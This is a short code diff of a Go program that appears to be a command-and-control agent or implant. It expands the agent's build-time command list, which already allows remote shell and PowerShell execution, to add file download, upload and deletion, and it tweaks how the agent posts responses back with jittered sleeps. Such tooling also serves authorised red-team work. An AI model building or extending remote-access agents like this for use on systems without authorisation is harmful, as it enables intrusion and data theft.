@@ -2,7 +2,7 @@
 //
 // Build with config injected:
 //
-//	go build -ldflags "-X main.cfgBlob=.. -X main.cfgKey=.. -X main.cfgNonce=.. -X main.includedCommands=shell,powershell,sleep,ls,exit"
+//	go build -ldflags "-X main.cfgBlob=.. -X main.cfgKey=.. -X main.cfgNonce=.. -X main.includedCommands=shell,powershell,sleep,ls,download,upload,rm,mkdir,exit"
 package main
 
 import (
@@ -63,7 +63,7 @@ func run() error {
 			exit = exit || done
 		}
 		if len(responses) > 0 {
-			if err := agent.postResponses(responses); err != nil {
+			if _, err := agent.postResponses(responses); err != nil {
 				time.Sleep(sleepTime(agent.interval, agent.jitter))
 				continue
 			}
